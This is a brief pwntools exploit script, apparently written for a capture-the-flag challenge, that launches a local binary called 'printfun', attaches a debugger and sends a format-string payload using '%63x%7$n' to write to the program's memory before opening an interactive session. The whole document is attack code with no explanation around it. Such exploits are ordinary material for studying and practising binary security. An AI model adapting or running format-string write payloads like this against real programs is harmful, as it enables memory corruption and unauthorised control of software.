from pwn import *

p = process('./printfun')
gdb.attach(p)

#p.recv()

p.sendline('A'+'\x00'+'%63x%7$n')

p.interactive()
